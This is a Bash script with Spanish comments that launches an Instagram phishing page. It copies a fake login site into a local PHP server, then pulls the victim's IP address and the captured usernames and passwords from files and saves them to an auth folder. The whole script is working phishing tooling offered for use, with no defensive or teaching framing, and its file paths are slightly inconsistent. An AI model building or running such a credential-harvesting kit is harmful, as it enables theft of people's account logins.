#!/bin/bash

# Autor: Manuel Dios
# Versión: 1.0.0

# Asignamos host y puerto para trabajar
HOST='127.0.0.1'
PORT='8080' 

# Menú principal
menu() {
    echo -e "\n[01] Página tradicional de Instagram"
    echo -e "[00] Salir"
    read -p "Selecciona una opción: " opcion
    case $opcion in
        1)
            website="instagram"
            sitio_conf
            capture_ip
            capture_creds
            ;;
        0)
            echo "Saliendo..."
            exit 0
            ;;
        *)
            echo "Opción inválida. Intenta de nuevo."
            menu
            ;;
    esac
}

# Ruta absoluta del directorio donde está el script
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")


# Crear directorios al momento de la ejecución
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi


# Verificar dependencias
dependencias() {
    if ! command -v php &>/dev/null || ! command -v curl &>/dev/null; then
        echo "Instalando dependencias..."
        sudo apt update
        sudo apt install -y php curl
    else
        echo "Dependencias ya instaladas."
    fi
}

# Configurar y ejecutar servidor local
sitio_conf() {
    echo "Configurando sitio..."
    # Asegúrate de que los archivos necesarios estén en `.sites/instagram/`
    cp -rf .sites/"$website"/* .server/www
    php -S "$HOST":"$PORT" -t .server/www > /dev/null 2>&1 &
    echo "Servidor corriendo en http://$HOST:$PORT"
}

# Capturar IP (opcional)
capture_ip() {
    if [[ -e .server/www/ip.txt ]]; then
        IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
        echo "IP de la víctima: $IP"
        cat .server/www/ip.txt >> auth/ip.txt
    fi
}

# Capturar credenciales (opcional)
capture_creds() {
    if [[ -e .server/auth/usernames.txt ]]; then
        ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
        PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
        echo "Cuenta: $ACCOUNT"
        echo "Contraseña: $PASSWORD"
        cat .server/www/usernames.txt >> auth/usernames.dat
    fi
}

# Ejecución principal
dependencias
menu
